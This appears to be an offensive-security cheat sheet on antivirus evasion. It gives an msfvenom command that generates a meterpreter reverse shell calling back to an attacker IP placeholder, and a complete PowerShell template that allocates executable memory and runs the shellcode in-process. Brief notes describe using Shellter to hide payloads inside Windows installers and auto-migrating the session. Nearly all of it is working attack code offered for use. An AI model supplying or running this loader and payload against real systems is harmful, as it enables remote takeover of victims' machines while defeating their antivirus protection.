# Antivirus Bypass

---

- [Powershell In-Memory Injection](#powershell-in-memory-injection)
- [Shellter](#shellter)

<a name="powershell-in-memory-injection"></a>
## Powershell In-Memory Injection
First create the payload.
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=__ATTACKER_IP__ LPORT=__ATTACKER_PORT__ -f powershell -v sc
```

Then copy the payload into the `<place your shellcode here>` placeholder. You must make sure it ends with a semi-colon `;` at the end.
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
<place your shellcode here>;
$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

<a name="shellter"></a>
## Shellter
Designed to be run on Windows so must be run with wine.

- Stealth mode - Attempts to restore PE execution flow so installer resumes normally.
- Custom Payloads - Need to terminate by existing current thread to resume normally in stealth mode.

Session created but died. We can auto run a migrate to change to a different process before it dies.
set AutoRunScript post/windows/manage/migrate

```sh
sudo wine shellter
```